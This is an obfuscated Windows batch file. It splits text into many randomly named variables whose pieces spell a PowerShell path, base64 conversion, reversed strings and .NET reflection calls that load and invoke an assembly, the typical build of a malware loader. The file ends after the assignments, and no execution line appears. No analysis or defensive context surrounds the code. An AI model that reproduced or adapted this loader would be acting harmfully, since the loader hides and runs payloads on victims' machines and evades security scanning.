@echo off
set "oIxyogGFJs=Sy"
set "BhgDVnqbFX=Wi"
set "iDRYEOCqmE=32"
set "AePochRHFO=Po"
set "ZrPAiQEwfm=:\"
set "wFtfjCcgeL=py"
set "xaOAKeQSWt=ow"
set "eTKjQPiTNS=nd"
set "tngcLHIxRf=rS"
set "NbxjZyLrAQ=xe"
set "ykiDLnXOdK=\W"
set "lNiXcEKcws= C"
set "HKImPAsFTR=st"
set "YGbSkdGEbP=s\"
set "LEFHaoRKnX=.e"
set "eMzyYNVGdP=he"
set "BbMMqjYsTc=he"
set "nNHWjeTKIa=do"
set "pIJaXBuTMC=ll"
set "lqQvrKDmtH=we"
set "mmeTPHlXXI=ll"
set "wxflZxSSYN=em"
set "yuPAnjDdei=1."
set "Mksquhimne=0\"
set "XQARpvySRu= /"
set "wKzjwyTUud=po"
set "eQeUzzgSyK=y "
set "YctosmpBzM=ws"
set "DqQQxhclTK=co"
set "KbLksQDmzQ=in"
set "diTPWyKRxk=rs"
set "kkQyESwEGF=we"
set "JciSsmYNCu=\v"
set "izoRzOmgda= %~dp0"
set "iDcTyHYpvQ=cd"
set "nsbWWSqEAo=em.I"
set "mcCszDPLLq=ke($"
set "ouAefeIXMt='txe"
set "CLDUtxVwZi=$gvm"
set "wmFPUXXxoG=z.En"
set "mfYiqUrofe=Syst"
set "SfKFQLucEM=Obje"
set "hCStLNjIFi=.Dis"
set "KDyMggbVlN=VRq "
set "RpsUgBfvmE=flec"
set "OlbAmTbpjV=)($Y"
set "YOBTtaMyYW=K) {"
set "YxlKQADZsp=Ct.T"
set "upchIZgEpU= '')"
set "bWCLbKkDTA=-1.."
set "hswcvqcgDm=k; }"
set "BzrceXoNNg='[-1"
set "ZiwAUCqlCj=oL'["
set "nzGxPtLUUV=oint"
set "pLEwGREeGw=aPVc"
set "MZSlhFyTpu=Conv"
set "QAWqSjHMoV=]::N"
set "rLiKkfyeoB=ne);"
set "vNzhhPBluc=[]] "
set "eHwHEWsDAW=isfL"
set "lukdCyovUV=onve"
set "JZZSMGssiz=();$"
set "QWXynlXybD=iron"
set "UNrYKUdbmq=y.Pa"
set "wRVoLELeSA=rtS4"
set "XlbGOZFaun=oryS"
set "EHOXiDjkEx=gnir"
set "LgRHUSVVGR=nirt"
set "kydZJjlniT=;$SJ"
set "CDKuxPibHw=F'[-"
set "TTfwfOslxf=rofi"
set "CPgZUVumtl=NwpV"
set "iVhpKnvycl=BC;$"
set "NjTPBhDZGe=New-"
set "sqYAQDsxIi=;$nR"
set "gfNIWsmTpA=('%*'"
set "YQULpXNZkN=tryP"
set "AMExqkkFuL=hy.A"
set "uQAgGCuGwf=Obje"
set "HMuoLXNJcu=y]::"
set "BtbqtjyvCE=UhtK"
set "GUGpDhAdIq=in $"
set "EoDOPFRVvz=($Cp"
set "CovSNMpVaF=agKC"
set "YDDNhMtXeq=]::("
set "mchweAZSfy='[-1"
set "afXJVNJrJN=NwpV"
set "rnOpqzJAwi=CL, "
set "ruhPhAhQTP=join"
set "sobmIYoIgl=$XpJ"
